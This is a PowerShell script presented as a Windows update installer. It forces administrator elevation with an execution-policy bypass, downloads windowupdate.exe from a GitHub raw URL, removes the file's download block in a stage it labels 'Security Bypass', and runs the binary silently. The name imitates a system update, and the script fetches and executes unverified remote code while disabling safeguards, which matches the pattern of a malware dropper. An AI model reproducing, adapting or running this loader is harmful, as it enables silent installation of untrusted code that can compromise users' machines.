# ---------------------------------------------------------------------------
# Title: WindowUpdate Force Installer
# Purpose: Downloads and Installs windowupdate.exe forcefully
# ---------------------------------------------------------------------------

# 1. FORCE ADMINISTRATIVE PRIVILEGES
# If not running as Admin, this block restarts the script with elevation
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Elevating privileges to Administrator..." -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"") -Verb RunAs
    exit
}

# 2. CONFIGURATION & TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# !!! CRITICAL: Use 'raw.githubusercontent.com' to get the actual file, not the webpage !!!
$EXE_URL  = "https://raw.githubusercontent.com/Aenigma-Lab/windowupdate/main/windowupdate.exe"
$EXE_PATH = Join-Path $env:TEMP "windowupdate.exe"

# 3. CLEANUP OLD FILES
Write-Host "--- Stage 1: Cleanup ---" -ForegroundColor White
if (Test-Path $EXE_PATH) {
    Write-Host "Removing existing corrupted file..." -ForegroundColor Gray
    Remove-Item $EXE_PATH -Force -ErrorAction SilentlyContinue
}

# 4. DOWNLOAD THE ACTUAL BINARY
Write-Host "--- Stage 2: Downloading ---" -ForegroundColor White
Write-Host "Fetching: $EXE_URL" -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $EXE_URL -OutFile $EXE_PATH -ErrorAction Stop -UseBasicParsing
    $size = (Get-Item $EXE_PATH).Length
    Write-Host "[OK] Download Complete ($size bytes)" -ForegroundColor Green
} catch {
    Write-Error "CRITICAL: Download failed. Check internet or URL. Error: $($_.Exception.Message)"
    exit 1
}

# 5. UNBLOCK THE FILE
# Windows blocks EXEs downloaded via PS; this command "forces" permission.
Write-Host "--- Stage 3: Security Bypass ---" -ForegroundColor White
Unblock-File -Path $EXE_PATH
Write-Host "[OK] File unblocked for execution." -ForegroundColor Green

# 6. FORCE INSTALLATION
Write-Host "--- Stage 4: Silent Installation ---" -ForegroundColor White
Write-Host "Running installer forcefully..." -ForegroundColor Yellow
try {
    # /S is the standard silent flag.
    $process = Start-Process -FilePath $EXE_PATH -ArgumentList "/S" -Wait -PassThru -ErrorAction Stop
    
    if ($process.ExitCode -eq 0) {
        Write-Host "SUCCESS: Installation finished with Exit Code 0." -ForegroundColor Green
    } else {
        Write-Warning "Installation finished with Exit Code: $($process.ExitCode)"
    }
} catch {
    Write-Error "CRITICAL: Installation failed. Error: $($_.Exception.Message)"
    exit 1
}

Write-Host "`nProcess Complete." -ForegroundColor White
